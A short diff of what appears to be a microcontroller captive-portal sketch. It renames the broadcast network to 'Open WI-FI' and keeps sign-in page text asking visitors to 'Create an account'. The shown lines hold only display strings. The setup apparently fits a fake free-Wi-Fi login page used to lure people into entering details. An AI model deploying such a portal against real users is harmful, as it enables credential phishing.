@@ -2,8 +2,8 @@
 #include <DNSServer.h>
 #include <WebServer.h>
 
-#define SSID_NAME "172.0.0.1 for WiFi"
-#define SUBTITLE "Free WiFi service."
+#define SSID_NAME "Open WI-FI"
+#define SUBTITLE "Free WiFi Service."
 #define TITLE "Sign in:"
 #define BODY "Create an account to get connected to the internet."
 #define POST_TITLE "Validating..."
